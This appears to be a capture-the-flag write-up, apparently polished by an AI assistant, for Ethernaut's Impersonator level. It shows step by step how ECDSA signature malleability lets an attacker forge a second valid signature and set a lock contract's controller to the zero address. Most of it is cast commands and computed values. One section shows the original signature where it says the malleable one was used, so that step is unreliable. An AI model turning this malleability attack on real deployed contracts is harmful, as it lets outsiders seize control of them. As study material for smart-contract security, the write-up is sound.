Here’s a **clean, recruiter-friendly version** of your README following your usual structure and improving clarity, flow, and impact 👇

---

# Ethernaut Challenge 32 — Impersonator

SlockDotIt’s new product, **ECLocker**, integrates IoT gate locks with Solidity smart contracts using **ECDSA signatures** for authorization.

When a valid signature is provided, the contract emits an `Open` event, unlocking the door for the authorized controller.

## 🎯 Goal

Compromise the system so that **anyone can open the door**, without needing the controller’s private key.

---

## 🔍 Initial Analysis

Instance:

```bash
IMPERSONATOR=0xF8F65561434423F8d03A9beE77308766786d9FEf
```

### Check deployed lock

```bash
cast call $IMPERSONATOR \
  "lockers(uint256)(address)" 0 \
  --rpc-url $SEPOLIA_RPC_URL
```

```
0x9C90c9a0B41B62C49d8CEf1f9dCb6dbb10AaEb49
```

```bash
ECLOCKER=0x9C90c9a0B41B62C49d8CEf1f9dCb6dbb10AaEb49
```

---

## 🧠 How the System Works

The `ECLocker` constructor:

1. Stores `lockId`
2. Builds a signed message hash:

   ```solidity
   keccak256("\x19Ethereum Signed Message:\n32" || lockId)
   ```
3. Recovers the `controller` using `ecrecover`

So authorization relies entirely on:

```solidity
ecrecover(msgHash, v, r, s)
```

---

## 🚨 Vulnerability — Signature Malleability

ECDSA signatures are **malleable**.

For a valid signature `(r, s, v)`, another valid signature exists:

* same `r`
* `s' = n - s`
* `v' = 27 ↔ 28`

Where:

```text
n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
```

### Critical issue

The contract:

* uses raw `ecrecover`
* does **not enforce low-s**
* stores used signatures based on `(r, s, v)`

This means:

> Two different `(r, s, v)` tuples can authorize the same message.

---

## 🧪 Extract Signature from Event

The factory emits:

```solidity
event NewLock(address lockAddress, uint256 lockId, uint256 timestamp, bytes signature);
```

We can get the log either with:

```bash
cast logs \
  --address $IMPERSONATOR \
  "NewLock(address,uint256,uint256,bytes)" \
  $ECLOCKER \
  --from-block 10657053 \
  --to-block 10657062 \
  --rpc-url $SEPOLIA_RPC_URL
```

Or on [Etherscan](
https://sepolia.etherscan.io/address/0xF8F65561434423F8d03A9beE77308766786d9FEf#events)

Extracted signature:

```text
0x1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B9178489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2000000000000000000000000000000000000000000000000000000000000001B
```

---

## 🔧 Split Signature

According to:

```solidity
mstore(add(ptr, 32), mload(add(_signature, 0x60))) // 32 byte v
mstore(add(ptr, 64), mload(add(_signature, 0x20))) // 32 bytes r
mstore(add(ptr, 96), mload(add(_signature, 0x40))) // 32 bytes s
```

we can split the signature:

```bash
R=0x1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B91
S=0x78489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2
V=27
```

---

## ❌ Original Signature Fails

```bash
cast send $ECLOCKER \
  "open(uint8,bytes32,bytes32)" \
  27 $R $S \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

```
SignatureAlreadyUsed
```

---

## 🧠 Exploit — Generate Malleable Signature

Compute:

```text
S2 = n - S
V2 = 28
```

So i did:

```bash
N=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
S=0x78489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2

# Convert to decimal (for subtraction)

cast --to-dec $N

# 115792089237316195423570985008687907852837564279074904382605163141518161494337

cast --to-dec $S

# 54405834204020870944342294544757609285398723182661749830189277079337680158706

S2 = N - S 

# Result:

Dec: 61386255033295324479228690463930298567438841096413154552415886062180481335631
Hex: 0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f
```

Result:

```bash
S2=0x87b7639b5f24e93bf106794133370f950d5e9b00f5b5c8cbd866a487529b814f
```

---

## ⚠️ Important Insight

I have tried:

```bash
cast send $ECLOCKER \
  "open(uint8,bytes32,bytes32)" \
  27 $R $S \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut 
```

But using the malleable signature on `open()` **consumes it**.

But we need it for `changeController()`.

So we restart with a fresh instance.

---

## 🚀 Final Exploit

New instance:

```bash
IMPERSONATOR=0x18a54Da1BFb716a01Aba43d5C00c03a02c7AF8d9
```

Get lock:

```bash
cast call $IMPERSONATOR \
  "lockers(uint256)(address)" 0 \
  --rpc-url $SEPOLIA_RPC_URL
```

```
0xc31B27b2d50C639DF104A82366A853bC34deDA58
```

```bash
ECLOCKER=0xc31B27b2d50C639DF104A82366A853bC34deDA58
```

---

## 💥 Take Control

Set controller to zero address:

```bash
ZERO_ADDRESS=0x0000000000000000000000000000000000000000

cast send $ECLOCKER \
  "changeController(uint8,bytes32,bytes32,address)" \
  28 $R $S2 $ZERO_ADDRESS \
  --rpc-url $SEPOLIA_RPC_URL \
  --account ethernaut
```

---

## ✅ Why This Solves the Challenge

Now:

```solidity
controller == address(0)
```

And:

```solidity
ecrecover(...) == address(0)
```

for **invalid signatures**

So:

anyone can call `open()` with random `(v, r, s)` and pass the check

